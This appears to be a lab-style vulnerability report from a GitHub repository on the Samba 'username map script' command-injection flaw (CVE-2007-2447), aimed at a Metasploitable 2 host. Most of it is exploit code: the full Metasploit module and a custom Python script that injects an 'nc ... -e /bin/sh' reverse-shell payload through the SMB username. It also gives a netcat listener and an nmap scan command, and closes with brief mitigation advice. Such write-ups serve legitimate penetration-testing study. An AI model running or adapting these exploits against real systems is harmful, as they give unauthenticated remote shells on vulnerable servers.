# Vulnerability Report: Samba Usermap Script Exploit (CVE-2007-2447)

**Severity**: Critical  
**Tools Used**: Custom Python Exploit, Netcat, Nmap  
**Suspicious Activity Detection & Threat Actor Behavior Simulation**  
**CVE**: CVE-2007-2447  
**Impact**: Remote Code Execution (RCE) via unauthenticated SMB request  
**Affected Host**: Metasploitable 2 (Samba 3.0.20)  
**Access Level Gained**: Reverse shell as user running smbd (typically root or nobody)  

---

## 1. Vulnerability: Samba username map script command injection

**Risk Description**:  
Samba 3.0.20 through 3.0.25rc3 contains a vulnerability where an attacker can execute arbitrary commands via specially crafted usernames. This flaw lies in the "username map script" mechanism, which executes unsanitized input before authentication.

**Exploitation Method**:
- A custom Python script sends a malicious username that embeds a reverse shell payload using bash.
- The payload initiates a connection back to the attacker's machine, providing a shell.

```bash
# Start listener on attacker's Kali machine
nc -lvnp 4444

# Run the exploit
python3 samba_exploit.py
```
**Exploit Used** :
```bash
  ##
# $Id: usermap_script.rb 10040 2010-08-18 17:24:46Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::SMB

	# For our customized version of session_setup_ntlmv1
	CONST = Rex::Proto::SMB::Constants
	CRYPT = Rex::Proto::SMB::Crypt

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Samba "username map script" Command Execution',
			'Description'    => %q{
					This module exploits a command execution vulerability in Samba
				versions 3.0.20 through 3.0.25rc3 when using the non-default
				"username map script" configuration option. By specifying a username
				containing shell meta characters, attackers can execute arbitrary
				commands.

				No authentication is needed to exploit this vulnerability since
				this option is used to map usernames prior to authentication!
			},
			'Author'         => [ 'jduck' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10040 $',
			'References'     =>
				[
					[ 'CVE', '2007-2447' ],
					[ 'OSVDB', '34700' ],
					[ 'BID', '23972' ],
					[ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534' ],
					[ 'URL', 'http://samba.org/samba/security/CVE-2007-2447.html' ]
				],
			'Platform'       => ['unix'],
			'Arch'           => ARCH_CMD,
			'Privileged'     => true, # root or nobody user
			'Payload'        =>
				{
					'Space'    => 1024,
					'DisableNops' => true,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							# *_perl and *_ruby work if they are installed
							# mileage may vary from system to system..
						}
				},
			'Targets'        =>
				[
					[ "Automatic", { } ]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'May 14 2007'))

		register_options(
			[
				Opt::RPORT(139)
			], self.class)
	end


	def exploit

		connect

		# lol?
		username = "/=`nohup " + payload.encoded + "`"
		begin
			simple.client.negotiate(false)
			simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
		rescue ::Timeout::Error, XCEPT::LoginError
			# nothing, it either worked or it didn't ;)
		end

		handler
	end

end
```
![Screenshot 2025-06-09 153539](https://github.com/user-attachments/assets/ea0f3821-75e8-48ac-8880-f029461931d2)

**Modified Exploit Script Snippet**:
```python
#!/usr/bin/env python3

import socket
import sys
import os

def build_payload(lhost, lport):
    return f'nc {lhost} {lport} -e /bin/sh'

def exploit(target_ip, lhost, lport):
    payload = build_payload(lhost, lport)

    # Username injection with shell escape
    evil_username = f"/=`nohup {payload}`"

    # SMB packet structure to trigger the vuln
    try:
        print("[*] Connecting to target SMB port...")
        s = socket.socket()
        s.connect((target_ip, 139))  # Port 139 for SMB
    except:
        print("[-] Connection failed.")
        return

    # Basic malformed NTLM setup (we only care about sending the username)
    print("[*] Sending malicious payload...")
    try:
        s.send(b"\x00" * 4)  # dummy header
        s.send(evil_username.encode() + b"\x00")
        print("[+] Payload sent! Check your listener.")
    except:
        print("[-] Failed to send payload.")
    finally:
        s.close()


def main():
    print("üêâ Samba Usermap Script Exploit (CVE-2007-2447) üêâ\n")
    target_ip = input("Target IP: ").strip()
    lhost = input("Your IP (for reverse shell): ").strip()
    lport = input("Your port (for reverse shell): ").strip()

    # Start a listener in another terminal: `nc -lvnp <lport>`
    print(f"\n[*] Make sure you're listening on {lhost}:{lport} with netcat.")
    confirm = input("[?] Ready to send exploit? (y/N): ").lower()
    if confirm == 'y':
        exploit(target_ip, lhost, lport)
    else:
        print("[-] Aborted.")


if __name__ == "__main__":
    main()

```
![Screenshot 2025-06-9 153539](https://github.com/user-attachments/assets/3161a67c-d0f3-4987-aa07-46055a23ab33)


**Target SMB Port**:
```bash
nmap -p 139,445 -sV 192.168.1.31 -sC
```

**Output Example**:
```
139/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
```

**Result**:
Reverse shell access from the vulnerable machine.

**Screenshot**:
![Screenshot 2025-06-09 154911](https://github.com/user-attachments/assets/042f39e7-3c6f-4423-9544-4940a3727ebe)


**Recommendation**:
- Upgrade Samba to a version above 3.0.25rc3.
- Disable or carefully secure `username map script` usage.
- Monitor for SMB login attempts with strange usernames.
- Apply network segmentation and firewall rules to limit SMB exposure.
- Use IDS/IPS to detect anomalous SMB traffic patterns.

---
